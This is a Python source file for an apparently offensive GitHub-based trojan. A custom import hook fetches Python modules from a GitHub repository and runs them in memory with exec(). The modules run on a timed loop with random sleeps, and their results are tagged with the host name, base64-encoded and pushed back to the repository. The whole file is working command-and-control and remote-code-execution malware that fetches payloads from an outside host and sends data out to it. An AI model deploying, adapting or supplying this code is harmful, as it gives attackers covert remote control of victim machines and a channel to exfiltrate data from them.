#!/usr/bin/env python3

import os
import gc
import sys
import json
import time
import queue
import random
import base64
import threading
import importlib
import platform
import datetime
from dotenv import load_dotenv

from github3 import login

class GitImporter(importlib.abc.Loader):
    """Load modules from a remote Git repository."""

    id           = f"GitImp{random.randint(1000, 9999)}"
    out_name     = f"{id}-{str(datetime.date.today())}"
    out_path     = f"data/{out_name}"
    modules_path = "modules/"

    def __init__(self,
                 user: str,
                 passwd: str,
                 repo: str,
                 modules: str,
                 sleep: int = 15):
        def __connect__(self):
            def two_way_auth(): pass
            self.git = login(
                username=user,
                password=passwd,
                two_factor_callback=two_way_auth
            )
            self.repo = self.git.repository(user, repo)
            self.branch = self.repo.branch("master")

        self.queue        = queue.Queue()
        self.modules      = modules
        self.module_code  = None
        self.sleep        = sleep
        self.out          = ""
        __connect__(self)
        sys.meta_path.insert(0, self) # dynamic module import
        self.run()

    def find_spec(self, fullname, path=None, target=None):
        """
        IP0: Locate module spec to be imported.
        """
        module_path = f"{self.modules_path}{fullname}.py"
        print(f"[!] Attempting to find module: {fullname} at {module_path}")
        module_content = self.git_file(module_path)
        if module_content:
            self.module_code = module_content
            print(f"[>] Module {fullname} successfully found.")
            return importlib.util.spec_from_loader(fullname, loader=self) # Create module spec object
        print(f"[!] Module {fullname} not found.")
        return None

    def create_module(self, spec):
        """
        IP1: Optional method to create a module object.
        """
        return None  # Use default module creation

    def exec_module(self, module):
        """
        IP2: Populates namespace and adds module to sys.modules (Load and exec. module code  to memory).
        """
        if self.module_code is None:
            raise ImportError(f"Cannot load module {module.__name__}: No code found.")
        print(f"[!] Executing module: {module.__name__}")
        exec(self.module_code, module.__dict__)

    def run_module(self, module):
        self.queue.put(1)
        result = sys.modules[module].run() # Available after exec_module (populated namespace)
        self.out += result + '\n'
        self.queue.get()

    def load_modules(self, config):
        loaded = []
        for mod in config:
            module_name = mod['module']
            try:
                if module_name not in sys.modules:
                    __import__(module_name)
                loaded.append({"module": module_name})
                print(f"[*] Successfully loaded module: {module_name}")
            except ImportError as e:
                print(f"[!] Failed to import module {module_name}: {e}")
                self.out += f"[!] Failed to import module {module_name}: {e}\n"
                continue
        if len(loaded) == len(config):
            self.out += f"[*] Modules successfully imported from: {self.modules}\n"
            return config
        return None
    
    def git_file(self, path: str) -> str:
        tree = self.repo.tree(self.branch.commit.sha, recursive=True)
        for file in tree.tree:
            if file.path == path:
                return base64.b64decode(
                    self.repo.blob(file.sha).content
                ).decode('utf-8')
        return None
    
    def git_update(self):
        def get_sha(path: str) -> str:
            tree = self.repo.tree(self.branch.commit.sha, recursive=True)
            for f in tree.tree:
                if f.path == path:
                    return f.sha
            return None

        sha = get_sha(self.out_path)
        if sha:
            self.repo.update_file(self.out_path, self.out_name, base64.b64encode(self.out.encode()), sha)
        else:
            self.repo.create_file(self.out_path, self.out_name, base64.b64encode(self.out.encode()))

    def run(self):
        while True:
            self.out += (100 * '*') + '\n'
            self.out += f"\t [!] Running on {platform.node()}\n"
            self.out += f"\t [!] Time: {datetime.datetime.now()}\n"

            if self.queue.empty():
                config = self.load_modules(
                   json.loads(self.git_file(self.modules))
                )
                if config:
                    for mod in config:
                        threading.Thread(target=self.run_module, args=(mod['module'],)).start()
                        time.sleep(random.randint(1, 10))
                    
                    print(f"[!] Modules complete\n")
                    self.out += f"[!] Modules complete\n"
                    self.git_update()
            self.out += f'[*] --- {self.sleep} ---\n'
            time.sleep(self.sleep)


if __name__ == "__main__":
    load_dotenv()
    ## Git Configuration Parameters
    user    = os.getenv("USER") # username
    passwd  = os.getenv("PASS") # Github token
    repo    = os.getenv("REPO") # Github repository name
    config  = os.getenv("CONFIG", "config/def.json")
    sleep   = os.getenv("SLEEP", "15")
    ## ----

    if not all([user, passwd]):
        raise EnvironmentError("Missing required environment variables.")

    GitImporter(user, passwd, repo, config, int(sleep))
    
    